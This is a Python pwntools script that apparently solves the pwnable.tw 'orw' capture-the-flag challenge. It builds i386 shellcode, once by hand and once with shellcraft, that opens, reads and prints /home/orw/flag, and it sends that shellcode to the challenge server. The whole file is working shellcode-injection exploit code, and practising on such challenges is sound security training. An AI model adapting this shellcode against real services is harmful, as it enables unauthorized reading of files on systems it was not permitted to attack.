from pwn import *
import sys

sys.path.append('../../') 
import pwn_tools

port = 10001
path = b'/home/orw/flag'

context.arch = 'i386'

def exploit(s):

    print (path)
    push_s = pwn_tools.s_u32(path)
    print (push_s)
    #buf = size that the program read and write
    buf = 40
    s.recvuntil('Give my your shellcode:', timeout = 0.1)
    #clean register and push path
    shellcode = asm('''
            xor eax, eax
            xor ebx, ebx
            xor ecx, ecx
            xor edx, edx
            push {}
            push {}
            push {}
            push {}
            '''.format(push_s[0], push_s[1], push_s[2], push_s[3]))
    #call open
    shellcode += asm('''
            mov ebx, esp
            mov al, 5
            int 0x80
            ''')
    #call read, eax save the return 'value'
    shellcode += asm('''
            mov ebx, eax
            mov ecx, esp
            mov edx, {}
            mov al, 3
            int 0x80
            '''.format(buf))
    #call write
    shellcode += asm('''
            mov ebx, 1
            mov ecx, esp
            mov edx, {}
            mov al, 4
            int 0x80
            '''.format(buf))
    shellcode += asm('''
            ret
            ''')
    s.sendline(shellcode)
    s.interactive()

def exploit2(s):
    buf = 40
    shellcode = shellcraft.i386.pushstr(path)
    shellcode += shellcraft.i386.linux.syscall('SYS_open', 'esp')
    shellcode += shellcraft.i386.linux.syscall('SYS_read', 'eax', 'esp', buf)
    shellcode += shellcraft.i386.linux.syscall('SYS_write', 1, 'esp', buf)
    s.sendline(asm(shellcode))
    s.interactive()


if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = remote('chall.pwnable.tw', port)
        exploit(s)

    else:
        s = remote(sys.argv[1], 1346)
        input('PAUSED')
        exploit(s)
